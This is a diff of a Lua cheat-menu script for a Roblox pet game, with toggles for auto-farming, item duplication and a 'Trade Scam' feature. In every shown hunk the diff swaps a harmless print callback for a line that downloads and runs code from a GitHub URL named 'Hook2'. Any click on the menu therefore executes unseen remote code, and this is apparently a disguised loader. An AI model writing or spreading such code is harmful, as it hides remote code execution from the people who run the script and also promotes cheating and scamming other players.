@@ -233,7 +233,7 @@ Player:AddToggle({
 	Name = "Auto Collect Gifts",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -241,7 +241,7 @@ Player:AddToggle({
 	Name = "Auto Instant Colelct",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -249,7 +249,7 @@ Player:AddToggle({
 	Name = "3x Coin Boost",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -257,7 +257,7 @@ Player:AddToggle({
 	Name = "3x Damage Boost",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -265,7 +265,7 @@ Player:AddToggle({
 	Name = "Auto Rank Rewards",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -273,7 +273,7 @@ Player:AddToggle({
 	Name = "Auto VIP Rewardds",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -398,7 +398,7 @@ Lucky:AddToggle({
 	Name = "Auto Snipe lucky Blocks",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -406,7 +406,7 @@ Lucky:AddToggle({
 	Name = "Auto Snipe Rainbow",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -418,7 +418,7 @@ Lucky:AddToggle({
 	Name = "2 minutes",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -426,7 +426,7 @@ Lucky:AddToggle({
 	Name = "3 minutes",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -434,7 +434,7 @@ Lucky:AddToggle({
 	Name = "5 minutes",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -442,7 +442,7 @@ Lucky:AddToggle({
 	Name = "10 minutes",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -470,7 +470,7 @@ Auto:AddToggle({
 	Name = "Auto Open Eggs",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -483,7 +483,7 @@ Auto:AddDropdown({
 	Default = "1",
 	Options = {"Shop", "Town", "Forest", "Beach", "Mine", "Winter", "Glacier", "Desert", "Volcano", "Cave", "Tech Entry", "Enchanted Forest", "Ancient Island", "Samurai Island", "Candy Island", "Haunted Island", "Hell Island", "Heaven Island", "Heaven's Gate", "Tech Shop", "Tech City", "Dark Tech", "Steampunk", "Alien Lab", "Steampunk Chest", "Alien Forest", "Glitch", "Giant Alien Chest", "Hacker Portal", "Axolotl Ocean", "Axolotl Deep Ocean", "Axolotl Cave", "Pixel Forest", "Pixel Kyoto", "Pixel Alps", "Pixel Vault", "Cat Paradise", "Cat Backyard", "Cat Taiga", "Cat Kingdom", "Wonderland", "Snowy Forest", "Elf Village", "North Pole"},
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -492,7 +492,7 @@ Auto:AddDropdown({
 	Default = "1",
 	Options = {"Multi", "Highest", "Lowest", "Highest to Lowest"},
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -500,7 +500,7 @@ Lucky:AddToggle({
 	Name = "Auto Farm",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 local AutoSection = Auto:AddSection({
@@ -512,7 +512,7 @@ Auto:AddDropdown({
 	Default = "1",
 	Options = {"Free Gifts", "Boost Mastery", "Eggs Mastery", "Lootbags Mastery", "Golden Eggs Mastery", "Coin Piles Mastery", "Crates Mastery", "Presents Mastery", "Vaults & Safes Mastery", "Chests Mastery", "Diamond Piles Mastery", "Converting Mastery", "Fusing Mastery", "Enchanting Mastery", "Dark Matter Mastery"},
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -520,7 +520,7 @@ Auto:AddToggle({
 	Name = "Auto Mastery",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -540,7 +540,7 @@ Pets:AddDropdown({
 	Default = "1",
 	Options = {"Coins V", "Fantasy Coins V", "Tech Coins V", "Rainbow Coins V", "Agility III", "Chest Breaker III", "Strenth V", "Super Teamwork", "Diamonds V", "Charm", "Gift III", "Glittering", "Magnet", "Royalty", "Companion III"},
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -548,7 +548,7 @@ Pets:AddToggle({
 	Name = "Auto Enchant",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -561,7 +561,7 @@ Pets:AddDropdown({
 	Default = "1",
 	Options = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10"},
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -569,7 +569,7 @@ Pets:AddToggle({
 	Name = "Auto Golden/Rainbow",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -577,7 +577,7 @@ Pets:AddToggle({
 	Name = "Auto Golden",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -585,7 +585,7 @@ Pets:AddToggle({
 	Name = "Auto Rainbow",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -633,7 +633,7 @@ Booth:AddTextbox({
 	Default = "",
 	TextDisappear = true,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end	  
 })
 
@@ -642,7 +642,7 @@ Booth:AddTextbox({
 	Default = "",
 	TextDisappear = true,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end	  
 })
 
@@ -651,7 +651,7 @@ Booth:AddTextbox({
 	Default = "",
 	TextDisappear = true,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end	  
 })
 
@@ -659,7 +659,7 @@ Booth:AddToggle({
 	Name = "Ignore Hell Rock",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -667,7 +667,7 @@ Booth:AddToggle({
 	Name = "Start/Stop Booth Snipe",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -675,7 +675,7 @@ Booth:AddToggle({
 	Name = "Start Server Hop",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -684,7 +684,7 @@ Booth:AddTextbox({
 	Default = "",
 	TextDisappear = true,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end	  
 })
 
@@ -826,7 +826,7 @@ Dupe:AddToggle({
 	Name = "Dupe Huges",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -834,7 +834,7 @@ Dupe:AddToggle({
 	Name = "Dupe EXclusives",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
@@ -870,7 +870,7 @@ TradeScam:AddToggle({
 	Name = "Trade Scam",
 	Default = false,
 	Callback = function(Value)
-		print(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/User%3AHook2", true))()
 	end    
 })
 
